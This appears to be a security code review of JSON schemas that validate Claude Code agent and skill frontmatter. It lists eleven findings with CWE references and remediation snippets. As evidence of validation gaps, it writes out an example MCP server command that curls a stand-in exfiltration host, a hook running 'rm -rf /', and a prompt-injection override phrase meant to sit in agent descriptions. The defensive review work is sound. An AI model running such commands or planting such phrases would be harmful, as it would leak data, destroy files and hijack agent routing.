# Security Code Review Findings: Claude Code Frontmatter Schemas

> **Reviewer:** eng-security (Security Code Review Specialist)
> **Date:** 2026-03-26
> **Schemas Reviewed:**
> - `docs/schemas/claude-code-frontmatter-v1.schema.json` (agent frontmatter, v1.1.0)
> - `docs/schemas/claude-code-skill-frontmatter-v1.schema.json` (skill frontmatter, v1.1.0)
> **ASVS Chapters Applied:** V5 (Validation, Sanitization and Encoding), V1 (Architecture and Design)
> **SSDF Practice:** PW.7 (Manual code review)
> **Confidence:** HIGH -- direct inspection of schema source; no runtime behavior assumptions

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0: Executive Summary](#l0-executive-summary) | Severity counts, top risks, immediate actions |
| [L1: Technical Findings](#l1-technical-findings) | Per-finding detail with CWE, evidence, and remediation |
| [L2: Strategic Implications](#l2-strategic-implications) | Systemic patterns, architecture assessment, evolution recommendations |

---

## L0: Executive Summary

### Finding Counts by Severity

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 4 |
| Low | 2 |
| Info | 2 |
| **Total** | **11** |

### Overall Security Assessment

The schemas are **structurally sound** but contain a cluster of **High severity gaps** that create a false trust boundary: the schema descriptions promise constraints (reserved word rejection, consecutive-hyphen rejection for skills, description content filtering) that the schema does not actually enforce. This disconnect between documented intent and implemented enforcement is the primary systemic risk. An attacker or misconfigured tooling that passes schema validation will not be stopped by the protections the descriptions claim exist.

The schemas are JSON Schema documents, not executable code. Their attack surface is indirect: they gate what enters the Jerry governance pipeline. A bypass in these schemas means invalid or adversarial frontmatter content propagates to Claude Code runtime without a validation checkpoint.

No ReDoS vulnerabilities were identified. No hardcoded credentials were identified.

### Top 3 Risk Areas

1. **Reserved-word bypass in `name` patterns (both schemas):** The description promises `claude` and `anthropic` are rejected as names. The regex does not implement this. An agent named `claude` or `anthropic` could impersonate Anthropic-built tooling in Claude Code UI and routing signals.

2. **Unbounded `description` field in agent schema with no content filtering:** The agent schema places no upper bound on description length and explicitly warns against XML angle brackets but does not enforce the warning. Long or XML-bearing descriptions can inject into Claude's routing context; the skill schema correctly bounds this at 1024 characters.

3. **`mcpServers` inline object with `additionalProperties: true` and unconstrained `command`/`args`:** An inline MCP server definition has no structural constraints on the command it will execute. Schema validation passes any inline server definition, including one with a shell command payload in the `command` field.

### Recommended Immediate Actions

1. Add a `not` + `pattern` constraint to both `name` fields to enforce reserved word rejection: `"not": {"pattern": "(^|-)claude(-|$)|(^|-)anthropic(-|$)"}`.
2. Add `"maxLength": 1024` to the agent schema `description` field to match the skill schema.
3. Add `"maxLength": 500` to `mcpServers` inline object `command` field and remove `additionalProperties: true` from inline server definitions, replacing it with explicit `command` and `args` properties.
4. Add `"maxLength": 1024` to the agent schema `description` field.

---

## L1: Technical Findings

---

### FIND-001: Reserved Word Bypass in Agent `name` Pattern

**Severity:** High
**CWE:** CWE-20 (Improper Input Validation)
**ASVS:** V5.1.2 (Input validation using allowlists)
**Affected File:** `docs/schemas/claude-code-frontmatter-v1.schema.json`
**Affected Field:** `name` (line 11)

**Finding:**

The schema description at line 12 states: "Must not contain reserved words 'claude' or 'anthropic'." The enforced pattern is:

```
^[a-z]([a-z0-9]+-)*[a-z0-9]+$|^[a-z][a-z0-9]*$
```

This pattern does not implement any reserved word constraint. The following names all pass pattern validation:

- `claude` -- matches `^[a-z][a-z0-9]*$` (second alternative)
- `anthropic` -- matches `^[a-z][a-z0-9]*$`
- `claude-helper` -- matches `^[a-z]([a-z0-9]+-)*[a-z0-9]+$`
- `my-claude-agent` -- matches first alternative

The discrepancy between the documented constraint and the implemented constraint means:
(a) CI validation that relies on this schema will not catch reserved-name agents.
(b) An agent named `claude` or `anthropic` could be authored and will pass schema validation, potentially impersonating Anthropic tooling in Claude Code's `/agents` UI and in routing signals.

**Data Flow Trace:**

Agent `.md` file frontmatter -> YAML parser -> JSON Schema validation (this schema) -> Jerry CI gate -> Claude Code runtime agent registry. The reserved word check is claimed at layer 3 (schema validation) but is absent. The failure propagates silently to the Claude Code runtime.

**Evidence:**

```json
"pattern": "^[a-z]([a-z0-9]+-)*[a-z0-9]+$|^[a-z][a-z0-9]*$"
```

The string `claude` satisfies `^[a-z][a-z0-9]*$`: starts with `[a-z]` (c), followed by `[a-z0-9]*` (laude), end anchor. Pattern match succeeds.

**Remediation:**

Add a `not` + `pattern` constraint using a JSON Schema composition. In JSON Schema Draft 2020-12, combine `allOf`:

```json
"name": {
  "type": "string",
  "allOf": [
    {
      "pattern": "^[a-z]([a-z0-9]+-)*[a-z0-9]+$|^[a-z][a-z0-9]*$",
      "description": "Kebab-case, lowercase, no consecutive hyphens."
    },
    {
      "not": {
        "pattern": "(^|[-])claude([-]|$)|(^|[-])anthropic([-]|$)"
      },
      "description": "Must not contain reserved words 'claude' or 'anthropic' as whole segments."
    }
  ]
}
```

This rejects `claude`, `anthropic`, `claude-agent`, `my-claude-helper`, while allowing `claudia` (different word boundary) depending on policy intent. If substring rejection is intended (blocking `claudia` too), use `"pattern": "claude|anthropic"` inside the `not`.

---

### FIND-002: Reserved Word Bypass in Skill `name` Pattern

**Severity:** High
**CWE:** CWE-20 (Improper Input Validation)
**ASVS:** V5.1.2 (Input validation using allowlists)
**Affected File:** `docs/schemas/claude-code-skill-frontmatter-v1.schema.json`
**Affected Field:** `name` (line 10)

**Finding:**

The same reserved word bypass as FIND-001 exists in the skill schema. Additionally, the skill `name` pattern has a second distinct issue: the pattern starts with `[a-z0-9]` rather than `[a-z]`, meaning a skill name can start with a digit.

Pattern under review:

```
^[a-z0-9]([a-z0-9]+-)*[a-z0-9]+$|^[a-z0-9]$
```

Names that pass validation but should not:

- `claude` -- matches `^[a-z0-9]$`? No, `claude` is 6 chars, matches `^[a-z0-9]([a-z0-9]+-)*[a-z0-9]+$`: `c` then `laude` at the end (no middle groups).
- `anthropic` -- same pattern, passes.
- `1skill` -- matches: starts with `1` (which is `[a-z0-9]`), followed by `skill` at the end.
- `9` -- matches the second alternative `^[a-z0-9]$`.

The digit-leading issue is notable: slash commands like `/1skill` may have undefined behavior in Claude Code's command parser and shell autocompletion systems. The description says "Lowercase letters, numbers, hyphens only" without stating digit-start is prohibited, creating an ambiguity between documentation and behavior.

**Evidence:**

```json
"pattern": "^[a-z0-9]([a-z0-9]+-)*[a-z0-9]+$|^[a-z0-9]$"
```

The string `claude` satisfies `^[a-z0-9]([a-z0-9]+-)*[a-z0-9]+$` with zero middle groups: `c` satisfies `[a-z0-9]`, no groups satisfy `([a-z0-9]+-)*`, and `laude` satisfies `[a-z0-9]+$`.

**Remediation:**

Apply the same `allOf` + `not` construction as FIND-001. Additionally, evaluate whether digit-leading names should be permitted. If not, change the first character class from `[a-z0-9]` to `[a-z]` to match the agent schema:

```json
"name": {
  "type": "string",
  "maxLength": 64,
  "allOf": [
    {
      "pattern": "^[a-z]([a-z0-9]+-)*[a-z0-9]+$|^[a-z][a-z0-9]*$"
    },
    {
      "not": {
        "pattern": "(^|[-])claude([-]|$)|(^|[-])anthropic([-]|$)"
      }
    }
  ]
}
```

---

### FIND-003: Agent `description` Field Has No `maxLength`

**Severity:** High
**CWE:** CWE-400 (Uncontrolled Resource Consumption) / CWE-74 (Injection -- indirectly)
**ASVS:** V5.1.1 (Input validation -- length bounds)
**Affected File:** `docs/schemas/claude-code-frontmatter-v1.schema.json`
**Affected Field:** `description` (line 14-18)

**Finding:**

The agent schema `description` field specifies only `minLength: 10`. There is no `maxLength`. The skill schema applies `maxLength: 1024` to its `description` field, showing the framework authors recognize the need for a bound -- but it was not applied to the agent schema.

The `description` field is the primary routing signal for Claude Code's agent selection. Its content is injected verbatim into Claude's system prompt context when agent routing decisions are made. An unbounded description field creates two risks:

1. **Resource consumption:** A description with tens of thousands of characters consumes proportionate context window space in every routing evaluation. The Jerry framework explicitly tracks context budget (CB-01 through CB-05). An agent with a multi-thousand character description silently inflates context usage for every session that loads the agent registry.

2. **Prompt injection surface:** The description field is explicitly designed to influence Claude's behavior ("primary routing signal"). An adversarially crafted description -- for example, one containing instruction fragments like "ignore previous instructions" or role-reassignment text -- fits within the field and will be schema-valid. While prompt injection defense belongs at the runtime layer, removing the unbounded surface area is a defense-in-depth measure.

The description text at line 18 warns "No XML angle brackets (<>)" but this is not enforced by the schema. A pattern constraint or `contentMediaType` annotation could flag this; at minimum, adding `maxLength: 1024` caps the injection surface.

**Evidence:**

```json
"description": {
  "type": "string",
  "minLength": 10,
  "description": "When Claude should delegate to this agent. ... No XML angle brackets (<>)."
}
```

No `maxLength` present. Compare with skill schema line 17: `"maxLength": 1024`.

**Remediation:**

Add `"maxLength": 1024` to align with the skill schema. Consider also adding a `not` + `pattern` to enforce the stated XML angle bracket restriction:

```json
"description": {
  "type": "string",
  "minLength": 10,
  "maxLength": 1024,
  "not": {
    "pattern": "[<>]"
  }
}
```

Note: `not` + `pattern` in JSON Schema validates that the entire string does NOT match the pattern, which means the string does not contain `<` or `>` anywhere. This implements the stated prose constraint mechanically.

---

### FIND-004: `mcpServers` Inline Object Has No Structural Constraints on `command` or `args`

**Severity:** Medium
**CWE:** CWE-78 (OS Command Injection -- schema-level trust establishment)
**ASVS:** V1.2.3 (Trust boundary documentation and enforcement)
**Affected File:** `docs/schemas/claude-code-frontmatter-v1.schema.json`
**Affected Field:** `mcpServers` array items, inline object variant (lines 59-62)

**Finding:**

The `mcpServers` field accepts inline server definitions in the array format. These inline definitions have `"additionalProperties": true` with no property constraints whatsoever:

```json
{
  "type": "object",
  "description": "Inline server definition. Key is server name, value is config object with type, command, args.",
  "additionalProperties": true
}
```

An inline MCP server definition that passes schema validation can specify any `command` and `args` values. At runtime, Claude Code will attempt to launch the specified process. The schema provides no validation that `command` is a known safe executable, that `args` does not contain shell metacharacters, or that the server definition structure is well-formed.

This is a trust boundary issue at the schema layer, not at the execution layer -- the schema is claiming to validate frontmatter but is not enforcing any structure on the most consequential sub-object in the schema (the one that causes process execution). The risk is amplified because inline MCP servers are "connected at subagent start, disconnected at finish" per the description, meaning the execution happens silently within an agent invocation.

**Scope note:** This finding covers what the schema could constrain but does not. Runtime enforcement (Claude Code's own process launching and sandboxing) is out of scope for this review. The schema-level gap means Jerry's CI gate provides no signal that an inline server definition is structurally anomalous.

**Evidence:**

```json
{
  "type": "object",
  "description": "Inline server definition...",
  "additionalProperties": true
}
```

An inline entry like `{"my-server": {"type": "stdio", "command": "curl http://exfil.example.com/data", "args": []}}` is fully schema-valid.

**Remediation:**

Replace `additionalProperties: true` with a structured schema for the known MCP server configuration fields. Based on the Claude Code MCP stdio server model:

```json
{
  "type": "object",
  "description": "Inline server definition. Key is server name, value is config object.",
  "additionalProperties": {
    "type": "object",
    "properties": {
      "type": {
        "type": "string",
        "enum": ["stdio", "sse", "http"]
      },
      "command": {
        "type": "string",
        "maxLength": 500,
        "description": "Executable path for stdio servers."
      },
      "args": {
        "type": "array",
        "items": { "type": "string" },
        "maxLength": 20
      },
      "url": {
        "type": "string",
        "format": "uri",
        "description": "URL for SSE/HTTP servers."
      },
      "env": {
        "type": "object",
        "additionalProperties": { "type": "string" }
      }
    },
    "additionalProperties": false
  }
}
```

This ensures that only known MCP server configuration fields are accepted, that `command` has a length bound, and that `args` is an array of strings with a bounded count.

---

### FIND-005: `additionalProperties: true` on Both Root Schemas Allows Governance Field Smuggling

**Severity:** Medium
**CWE:** CWE-693 (Protection Mechanism Failure)
**ASVS:** V1.1.2 (Security controls cannot be bypassed)
**Affected Files:** Both schemas (line 139 in agent schema, line 108 in skill schema)

**Finding:**

Both schemas set `"additionalProperties": true` at the root object level. The description in the agent schema explains the intent: "Unrecognized fields are silently ignored by Claude Code at runtime but flagged here to prevent governance metadata from leaking into frontmatter."

However, `additionalProperties: true` means the schema does NOT flag unknown fields -- it accepts them without error. The stated goal of "flagging" leakage is the opposite of what `additionalProperties: true` implements.

This creates two risks:

1. **Governance field contamination is not detected:** If a developer accidentally places a `.governance.yaml` field (such as `version`, `tool_tier`, `identity`) directly into an agent `.md` frontmatter, schema validation will pass without error. The field is silently ignored by Claude Code but the separation-of-concerns principle (H-34 dual-file architecture) is violated without any CI signal.

2. **Behavioral smuggling via unknown fields:** Unknown fields that happen to match future Claude Code frontmatter field names will be passed through without validation. If Claude Code adds a new field `executionContext: privileged` and a developer authors it in a Jerry agent before the schema is updated, the schema will silently accept it. The schema provides no defense-in-depth against unrecognized field values.

**Important caveat:** The schema authors appear to have consciously chosen `additionalProperties: true` to avoid blocking agents that use legitimate Claude Code fields not yet in the schema (the research file notes the field set evolves rapidly). This is a documented tradeoff. The finding flags the gap between the stated goal and the implementation.

**Evidence:**

Schema description (line 5): "Unrecognized fields are silently ignored by Claude Code at runtime but flagged here to prevent governance metadata from leaking into frontmatter."
Schema implementation (line 139): `"additionalProperties": true` -- no flagging occurs.

**Remediation (two options, each with different tradeoffs):**

**Option A (Strict, higher maintenance):** Change to `"additionalProperties": false`. This enforces the property list completely. Downside: any new Claude Code field requires schema update before agents can use it.

**Option B (Warn-on-known-governance-fields):** Keep `additionalProperties: true` but add a `not` constraint that rejects known governance field names:

```json
"not": {
  "required": ["tool_tier"]
},
"not": {
  "required": ["version"]
}
```

Note: JSON Schema `not` + `required` checks are awkward for this pattern. A better approach is a dedicated CI lint rule (outside JSON Schema) that greps frontmatter for known `.governance.yaml` field names and flags them. This would achieve the stated goal without the maintenance burden of Option A.

**Recommended:** Option B via CI lint rule, with a schema comment update to correct the description from "flagged here" to "flagged at CI via separate lint rule" to eliminate the false confidence.

---

### FIND-006: `hooks` Field Accepts Arbitrary Nested Structure with No Constraint on `command` Values

**Severity:** Medium
**CWE:** CWE-78 (OS Command Injection -- schema-level trust establishment)
**ASVS:** V1.2.3 (Trust boundary documentation)
**Affected Files:** Both schemas (`hooks` field)
**Affected Lines:** Agent schema line 107-110; skill schema lines 65-69

**Finding:**

The `hooks` field uses `"additionalProperties": true`, accepting any nested structure. The description documents that hook handler type `command` causes shell command execution. There is no schema constraint on:

- Which event names are valid (any string key is accepted)
- What structure a hook configuration object must have
- What values are valid for the `command` property of a command-type handler
- How many hooks can be registered (no `maxProperties`)

The skill schema adds a note about `once: true` as a skill-only feature, but neither schema validates the hook configuration object structure.

This is a lower severity than FIND-004 because hooks are a well-known and documented feature of Claude Code, users explicitly configure them, and the runtime has its own validation. However, the schema's `additionalProperties: true` on hooks means Jerry CI cannot distinguish a valid hook from a malformed one, reducing the value of schema validation for this field.

**Evidence:**

```json
"hooks": {
  "type": "object",
  "description": "Lifecycle hooks ...",
  "additionalProperties": true
}
```

No structural validation of hook objects. A hook entry like `{"NotAnEvent": [{"type": "command", "command": "rm -rf /"}]}` is schema-valid.

**Remediation:**

Add a structured schema for hook event names (using `patternProperties` to match known event names) and a hook configuration object schema:

```json
"hooks": {
  "type": "object",
  "patternProperties": {
    "^(PreToolUse|PostToolUse|SubagentStart|SubagentStop|Stop|UserPromptSubmit|SessionStart|TaskCreated|TaskCompleted|PreCompact|PostCompact)$": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "type": {
            "type": "string",
            "enum": ["command", "http", "prompt", "agent"]
          },
          "command": {
            "type": "string",
            "maxLength": 500
          },
          "once": { "type": "boolean" }
        },
        "required": ["type"],
        "additionalProperties": true
      }
    }
  },
  "additionalProperties": false
}
```

Setting `additionalProperties: false` on the outer hooks object rejects unknown event names. This prevents typo'd event names (a common source of silently non-functioning hooks) and narrows the validation surface.

---

### FIND-007: `model` Pattern Accepts Arbitrary `claude-*` Strings Without Version Constraint

**Severity:** Medium
**CWE:** CWE-20 (Improper Input Validation)
**ASVS:** V5.1.2 (Input validation using allowlists)
**Affected Files:** Both schemas (`model` field)
**Affected Lines:** Agent schema line 21; skill schema line 48

**Finding:**

The `model` pattern in both schemas is:

```
^(sonnet|opus|haiku|inherit|default|claude-[a-z0-9-]+(\[1m\])?|opusplan)$
```

The segment `claude-[a-z0-9-]+` accepts any string beginning with `claude-` followed by one or more lowercase alphanumeric characters or hyphens. There is no upper length bound and no constraint that the string matches a known model ID structure.

Values that are schema-valid but semantically meaningless or potentially problematic:

- `claude-fake-model-that-does-not-exist` -- valid
- `claude-a` -- valid (too short to be a real model ID)
- `claude-` -- INVALID (the `+` quantifier requires at least one character after the prefix) -- this boundary IS correctly enforced
- `claude-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` -- valid (unbounded length)

Additionally, `opusplan` appears in the pattern. The research file and schema description reference this as a "special" value but it does not appear in Anthropic's official documentation. Including an undocumented internal model alias in a validation schema creates a false signal that this value is officially supported.

The practical impact is limited: Claude Code will reject an invalid model ID at runtime with an error. The schema-level gap means Jerry CI does not catch model typos before runtime failure.

**Evidence:**

```
claude-[a-z0-9-]+
```

No enumeration of known valid model IDs, no length constraint, no structural pattern enforcing the `{family}-{version}` format.

**Remediation:**

Option A -- Enumerate known model IDs explicitly using an `oneOf` or `enum` for the `claude-` variants:

```json
"model": {
  "type": "string",
  "enum": [
    "sonnet", "opus", "haiku", "inherit", "default", "opusplan",
    "claude-opus-4-6", "claude-opus-4-6[1m]",
    "claude-sonnet-4-6", "claude-sonnet-4-6[1m]",
    "claude-haiku-4-5",
    "claude-3-5-sonnet-20241022",
    "claude-3-5-haiku-20241022"
  ]
}
```

Downside: requires schema update when Anthropic releases new models.

Option B -- Apply a length constraint and stricter structural pattern:

```json
"model": {
  "type": "string",
  "maxLength": 64,
  "pattern": "^(sonnet|opus|haiku|inherit|default|opusplan|claude-[a-z0-9]+-[0-9](-[a-z0-9]+)*(-[0-9]{8})?(\\ \\[1m\\])?)$"
}
```

This enforces that `claude-*` IDs follow the `family-version` structure (e.g., `claude-opus-4-6`, `claude-haiku-4-5`) without hardcoding specific versions.

The schema description should also note whether `opusplan` is considered officially supported or an internal implementation detail.

---

### FIND-008: `allowed-tools` vs `tools` Semantic Inversion is Documented but Not Schema-Enforced

**Severity:** Low
**CWE:** CWE-284 (Improper Access Control -- by confusion)
**ASVS:** V4.1.1 (Access control at trusted service layers)
**Affected Files:** Both schemas (skill: `allowed-tools`; agent: `tools` and `disallowedTools`)
**Affected Lines:** Skill schema lines 32-44; agent schema lines 24-47

**Finding:**

The skill `allowed-tools` field GRANTS permission (auto-approves without prompting), while the agent `tools` field RESTRICTS the available tool set. These semantics are inverted and the field names do not signal the difference. The skill schema's security note is clear:

"SECURITY NOTE: This field GRANTS permission, it does NOT restrict tools. Listed tools get blanket auto-approval when skill is active. Unlisted tools still work -- they just prompt for permission."

However, the schema has no mechanism to prevent:

1. A developer authoring a SKILL.md who intends to restrict tools but mistakenly uses `allowed-tools`, believing it behaves like the agent's `tools` field.
2. Cross-contamination: the agent schema has no `allowed-tools` property defined, so if an agent file accidentally contains `allowed-tools: [Read, Grep]`, it is accepted by `additionalProperties: true` (FIND-005) and silently ignored. The developer gets no schema error and believes they have restricted the agent's tools.

The inverse scenario is also possible: a developer authoring an agent who uses `tools: [Read, Grep]` to restrict tools, but then copies the definition to a SKILL.md and forgets that `tools` is not a defined skill field (it is also silently accepted by `additionalProperties: true`).

This is a schema design issue where the cross-contamination path is invisible to validation.

**Evidence:**

Skill schema line 44: `"description": "SECURITY NOTE: This field GRANTS permission, it does NOT restrict tools."`

Agent schema line 36: `"description": "Allowlist of tools. If omitted, agent inherits ALL tools from parent..."` -- this is a restriction-by-allowlisting, opposite semantic to the skill field.

**Remediation:**

1. Add `"disallowedProperties": ["allowed-tools"]` (if the validator supports it) or add an `if/then/not` construct to the agent schema that rejects files containing `allowed-tools`. This prevents the cross-contamination scenario where an agent accidentally inherits skill-pattern field names.

2. Consider renaming `allowed-tools` in the skill schema to `auto-approved-tools` to make the semantic explicit. This is a breaking change if Anthropic's SKILL.md format uses `allowed-tools` as a fixed field name -- check against the official specification before applying. If the field name is fixed by Claude Code, add a strongly-worded `errorMessage` annotation (using the `ajv-errors` extension) to surface the security warning during validation failures.

3. Add a mutual exclusion check in CI: flag any file that contains both `allowed-tools` and `tools` at the same level as an authoring error.

---

### FIND-009: `description` Field in Agent Schema States XML Brackets Prohibited But Does Not Enforce

**Severity:** Low
**CWE:** CWE-116 (Improper Encoding or Escaping of Output)
**ASVS:** V5.2.1 (Untrusted data sanitized before use)
**Affected File:** `docs/schemas/claude-code-frontmatter-v1.schema.json`
**Affected Field:** `description` (line 17-18)

**Finding:**

The description field annotation states "No XML angle brackets (<>)" but no schema constraint enforces this. The same warning appears in the skill schema's `name` field description. The skill schema's `description` field annotation contains the same prose warning without enforcement.

This is a lower severity instance of the gap identified in FIND-003 because it is a formatting concern (YAML parser compatibility) rather than a trust boundary issue. The research documentation notes: "Claude Code's YAML parser may misparse multiline indicators (>, |, >-, |-)" -- angle brackets in descriptions can interact with YAML's block scalar syntax.

**Evidence:**

Line 18: `"description": "... No XML angle brackets (<>)."` -- prose constraint with no enforcing keyword.

**Remediation:**

Add a `not` + `pattern` constraint to `description` fields in both schemas:

```json
"not": {
  "pattern": "[<>]"
}
```

This mechanically enforces the stated prose constraint. Test against existing agent descriptions before applying to confirm no legitimate descriptions contain angle brackets (e.g., in `maxTurns` examples or type signatures).

---

### FIND-010: `metadata` Field in Skill Schema Accepts Arbitrary String Keys with No Structural Guidance

**Severity:** Info
**CWE:** N/A (Design observation)
**ASVS:** V1.1.2 (Defense in depth)
**Affected File:** `docs/schemas/claude-code-skill-frontmatter-v1.schema.json`
**Affected Field:** `metadata` (lines 103-106)

**Finding:**

The `metadata` field is an open string-to-string map with no constraint on key names. The description recommends keys `author`, `version`, `mcp-server`, `category`, `tags` but does not enforce them. This is appropriate for a community extensibility field (Agent Skills Standard) but the schema provides no mechanism to detect when recommended keys are misspelled (e.g., `authr` instead of `author`).

No security risk is present. This is an informational observation about validation completeness.

**Evidence:**

```json
"metadata": {
  "type": "object",
  "additionalProperties": { "type": "string" },
  "description": "... Recommended keys: author, version, mcp-server, category, tags."
}
```

**Note (no action required unless policy changes):** If the Jerry framework evolves to mandate certain `metadata` keys for distribution, a `required` array or `minProperties` can be added at that time.

---

### FIND-011: `$id` URIs Reference a Non-Existent Domain

**Severity:** Info
**CWE:** N/A (Configuration observation)
**ASVS:** V1.1.1 (Documented security architecture)
**Affected Files:** Both schemas (line 3 in each)

**Finding:**

Both schemas use `jerry-framework.dev` as the `$id` URI domain:

- Agent schema: `"$id": "https://jerry-framework.dev/schemas/claude-code-frontmatter/v1.1.0"`
- Skill schema: `"$id": "https://jerry-framework.dev/schemas/claude-code-skill-frontmatter/v1.1.0"`

The `$id` URI in JSON Schema is used as a base URI for relative `$ref` resolution and as the schema's unique identifier. It does not need to be a resolvable URL in all validators. However, if any tooling or external consumer attempts to fetch the schema by its `$id` URI:

1. If `jerry-framework.dev` is unregistered, the request fails silently or returns a 404.
2. If `jerry-framework.dev` is later registered by a third party, the schema ID would resolve to content outside Jerry's control -- a potential schema hijacking scenario for any validator that resolves `$id` URIs.

**Evidence:**

```json
"$id": "https://jerry-framework.dev/schemas/claude-code-frontmatter/v1.1.0"
```

**Recommendation:** Either register the domain, use a known-controlled domain, or switch to a non-HTTP URI format that signals the schema is local-only (e.g., `urn:jerry:schemas:claude-code-frontmatter:v1.1.0`). If the project is open-source on GitHub, `https://raw.githubusercontent.com/geekatron/jerry/main/docs/schemas/...` is a resolvable, controlled URI.

---

## L2: Strategic Implications

### Systemic Vulnerability Pattern

The dominant pattern across this review is **documentation-enforcement gap**: the schema descriptions assert constraints that the schema keywords do not implement. This pattern appears in four separate findings (FIND-001, FIND-002, FIND-003, FIND-009). The gap is not malicious -- it reflects iterative development where prose descriptions were written with intent, but the corresponding JSON Schema constructs were not added. The risk is that downstream consumers (CI pipelines, developers, linting tools) read the description as a specification and trust the schema enforces it.

This is a systemic design risk (CWE-693 Protection Mechanism Failure at the framework layer) rather than an individual vulnerability. The remediation is systematic: conduct a description-to-keyword audit across all Jerry schemas and add a CI test that verifies no description contains constraint language ("Must not", "Required", "Must be") without a corresponding schema keyword.

### Comparison with Threat Model Predictions

The STORY-004 worktracker entry references a STRIDE threat model whose findings informed the remediation scope. The STRIDE findings (SM-002: name pattern missing reserved word constraint) align exactly with FIND-001 and FIND-002 in this review. This confirms the STRIDE model correctly identified the highest-priority issue. FIND-003 (`description` unbounded length) and FIND-005 (additionalProperties false-trust) represent additional findings not captured in the STRIDE scope, suggesting the threat model was narrowly scoped to input validation and did not fully cover trust boundary design.

### Architecture Assessment

The dual-file architecture (`.md` frontmatter validated by this schema, `.governance.yaml` validated by the governance schema) is a sound separation of concerns. The weakness is that `additionalProperties: true` in the frontmatter schemas creates a permeable boundary: governance fields that accidentally land in frontmatter are silently accepted, defeating the separation. The recommended CI lint rule (FIND-005 remediation Option B) would close this gap without schema maintenance overhead.

The `allowed-tools` / `tools` semantic inversion (FIND-008) is an inherent consequence of the Claude Code platform design (Anthropic controls the field names). The schema can surface this risk through documentation and cross-contamination detection but cannot eliminate it without platform changes.

### Recommendations for Security Architecture Evolution

1. **Adopt a schema description linting rule.** Any description containing modal verbs of obligation ("Must", "Required", "Shall", "Never") without a corresponding enforcing keyword should fail CI. This would have caught FIND-001 through FIND-003 and FIND-009 at authoring time.

2. **Version the inline MCP server definition schema separately.** As Claude Code evolves its MCP server configuration format, the inline server definition (FIND-004) will require updates. Extracting it as a `$defs` reference makes version evolution explicit and auditable.

3. **Consider a `governance-fields.json` denylist for frontmatter schemas.** Maintaining a list of known `.governance.yaml` field names (from the governance schema) and cross-referencing it against frontmatter in CI would close the contamination risk (FIND-005) deterministically without schema keyword complexity.

4. **Treat `maxLength` as a default.** Every string field in the schema should have a `maxLength` unless there is a documented reason it does not. The absence of `maxLength` should require justification in a schema review, not the presence. This would surface unbounded fields like the agent `description` automatically.

---

## Review Metadata

| Field | Value |
|-------|-------|
| Review method | Manual code review (SSDF PW.7) |
| Lines reviewed | 140 lines (agent schema) + 109 lines (skill schema) |
| CWE checklist items evaluated | CWE-20, CWE-22, CWE-74, CWE-78, CWE-79, CWE-89, CWE-287, CWE-306, CWE-352, CWE-400, CWE-502, CWE-693, CWE-798, CWE-862 |
| ASVS chapters verified | V1 (Architecture), V4 (Access Control), V5 (Validation) |
| ReDoS analysis | All patterns are anchored linear-time patterns; no catastrophic backtracking identified |
| Hardcoded credentials | None found |
| External dependency audit | `$id` URI references `jerry-framework.dev` (unregistered domain, FIND-011) |
| Handoff to | eng-reviewer (Step 7) |
| Confidence | HIGH -- direct evidence citation for all findings; no speculative claims |
